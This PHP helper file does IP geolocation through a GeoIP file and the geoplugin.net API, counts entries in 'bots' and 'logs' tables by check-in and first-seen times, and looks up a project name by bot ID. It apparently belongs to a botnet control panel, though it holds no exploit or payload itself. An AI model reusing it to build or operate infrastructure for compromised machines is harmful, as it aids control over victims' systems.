<?php
require_once("geoip.inc");
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);
$ip = $_GET['ip'];//"50.23.113.246";
$Country = CountryName($ip);
echo $Country;

function CountryName($IP){

	global $gi;

	//$country= geoip_country_name_by_addr($gi, $IP) ;
    $country= ip_info($IP, "Country"); // United States
    /*
	    echo ip_info("173.252.110.27", "Country"); // United States
		echo ip_info("173.252.110.27", "Country Code"); // US
		echo ip_info("173.252.110.27", "State"); // California
		echo ip_info("173.252.110.27", "City"); // Menlo Park
		echo ip_info("173.252.110.27", "Address"); // Menlo Park, California, United States
    */
	if (empty($country)) return 'Unk';

	return $country;
}

 function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}

 function calculateTimeStamp($last_time)
 {


if($last_time=='today')
{
$timestamp = strtotime('00:00:00');
$timestamp2 = strtotime('23:59:59');

$sql = "SELECT COUNT(*) FROM `bots` WHERE  knock_time>=$timestamp and knock_time<=$timestamp2";
}
else
{
$timestamp = strtotime('-' .$last_time);

$sql = "SELECT COUNT(*) FROM `bots` WHERE  knock_time>=".$timestamp;
}
$sqlObj = mysql_query($sql);
$sqlAss = mysql_fetch_row($sqlObj);

return $sqlAss[0];
}
function calculateCreateTimeStamp($last_time)
{


    if($last_time=='today')
    {
        $timestamp = strtotime('00:00:00');
        $timestamp2 = strtotime('23:59:59');

        $sql = "SELECT COUNT(*) FROM `bots` WHERE  first_time>=$timestamp and first_time<=$timestamp2";
    }
    else
    {
        $timestamp = strtotime('-' .$last_time);

        $sql = "SELECT COUNT(*) FROM `bots` WHERE  first_time>=".$timestamp;
    }
    $sqlObj = mysql_query($sql);
    $sqlAss = mysql_fetch_row($sqlObj);

    return $sqlAss[0];
}

function calculateLogsCount($last_time)
{


    if($last_time=='today')
    {
        $timestamp = strtotime('00:00:00');
        $timestamp2 = strtotime('23:59:59');

        $sql = "SELECT COUNT(*) FROM `logs` WHERE  `date`>=$timestamp and `date`<=$timestamp2";
    }
    else
    {
        $timestamp = strtotime('-' .$last_time);

        $sql = "SELECT COUNT(*) FROM `logs` WHERE  `date`>=".$timestamp;
    }
    $sqlObj = mysql_query($sql);
    $sqlAss = mysql_fetch_row($sqlObj);

    return $sqlAss[0];
}

function getBotCount(){
    $sql = "select COUNT(*) from `bots`";
    $sqlObj = mysql_query($sql);
    $sqlAes = mysql_fetch_row($sqlObj);
    return $sqlAes[0];
}
function GetPrjNameByUIN($botid){
	$botid=mysql_real_escape_string($botid);
	$q=mysql_query("SELECT `prj_name` FROM `bots` WHERE `unique_id`='".$botid."' LIMIT 1");
	if(mysql_num_rows($q)>0){
		$row=mysql_fetch_assoc($q);
		return $row['prj_name'];
	} else return '';
}

?>